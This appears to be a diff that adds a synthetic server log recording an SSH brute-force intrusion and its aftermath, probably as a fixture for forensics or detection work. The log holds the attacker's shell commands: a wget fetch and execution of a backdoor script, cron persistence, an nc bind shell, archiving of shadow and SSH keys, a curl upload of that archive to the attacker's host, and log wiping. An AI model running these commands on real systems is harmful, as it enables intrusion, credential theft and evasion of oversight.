@@ -1,0 +1,27 @@
+2024-03-15 08:00:01 sshd[1234]: Accepted publickey for admin from 203.0.113.50 port 22
+2024-03-15 08:00:15 kernel: [UFW BLOCK] SRC=45.33.32.156 DST=192.168.1.10 PROTO=TCP DPT=4444
+2024-03-15 08:01:22 sshd[1240]: Failed password for root from 185.220.101.45 port 55832 ssh2
+2024-03-15 08:01:23 sshd[1241]: Failed password for root from 185.220.101.45 port 55833 ssh2
+2024-03-15 08:01:24 sshd[1242]: Failed password for root from 185.220.101.45 port 55834 ssh2
+2024-03-15 08:01:25 sshd[1243]: Failed password for root from 185.220.101.45 port 55835 ssh2
+2024-03-15 08:01:26 sshd[1244]: Failed password for root from 185.220.101.45 port 55836 ssh2
+2024-03-15 08:01:27 sshd[1245]: Failed password for root from 185.220.101.45 port 55837 ssh2
+2024-03-15 08:01:28 sshd[1246]: Failed password for root from 185.220.101.45 port 55838 ssh2
+2024-03-15 08:01:29 sshd[1247]: Failed password for root from 185.220.101.45 port 55839 ssh2
+2024-03-15 08:01:30 sshd[1248]: Failed password for admin from 185.220.101.45 port 55840 ssh2
+2024-03-15 08:01:31 sshd[1249]: Accepted password for admin from 185.220.101.45 port 55841 ssh2
+2024-03-15 08:02:00 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+2024-03-15 08:02:15 bash[1300]: HISTORY: PID=1300 UID=0 whoami
+2024-03-15 08:02:18 bash[1300]: HISTORY: PID=1300 UID=0 cat /etc/shadow
+2024-03-15 08:02:25 bash[1300]: HISTORY: PID=1300 UID=0 wget http://185.220.101.45:8080/backdoor.sh -O /tmp/bd.sh
+2024-03-15 08:02:30 bash[1300]: HISTORY: PID=1300 UID=0 chmod +x /tmp/bd.sh
+2024-03-15 08:02:31 bash[1300]: HISTORY: PID=1300 UID=0 /tmp/bd.sh
+2024-03-15 08:02:45 bash[1300]: HISTORY: PID=1300 UID=0 crontab -e
+2024-03-15 08:02:50 crontab[1310]: (root) REPLACE (root)
+2024-03-15 08:03:00 bash[1300]: HISTORY: PID=1300 UID=0 nc -lvp 4444 -e /bin/bash
+2024-03-15 08:03:15 kernel: [UFW ALLOW] SRC=185.220.101.45 DST=192.168.1.10 PROTO=TCP DPT=4444
+2024-03-15 08:03:30 bash[1300]: HISTORY: PID=1300 UID=0 tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow /home/admin/.ssh/
+2024-03-15 08:03:45 bash[1300]: HISTORY: PID=1300 UID=0 curl -X POST http://185.220.101.45:8080/upload -F 'file=@/tmp/exfil.tar.gz'
+2024-03-15 08:04:00 bash[1300]: HISTORY: PID=1300 UID=0 rm -rf /tmp/bd.sh /tmp/exfil.tar.gz /var/log/auth.log
+2024-03-15 08:04:15 bash[1300]: HISTORY: PID=1300 UID=0 history -c
+2024-03-15 08:05:00 sshd[1249]: session closed for user admin
